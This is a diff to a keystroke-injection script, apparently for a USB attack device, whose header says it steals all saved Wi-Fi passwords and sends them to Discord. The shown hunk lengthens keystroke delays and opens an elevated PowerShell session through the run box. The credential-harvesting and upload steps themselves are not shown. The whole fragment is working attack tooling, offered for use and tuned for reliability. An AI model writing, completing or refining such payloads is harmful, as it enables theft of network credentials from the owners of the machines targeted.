@@ -2,14 +2,14 @@ REM Author: Drack0z
 REM Description: Steals all of the saved Wifi Passwords and send to discord using.
 REM Version:	1.0
 REM Category:	Passwords
-DELAY 500
+DELAY 900
 GUI d
-DELAY 500
+DELAY 900
 GUI r
-DELAY 500
+DELAY 900
 STRING powershell
 ENTER
-DELAY 500
+DELAY 900
 STRING Start-Process powershell -Verb runAs
 ENTER
 DELAY 800
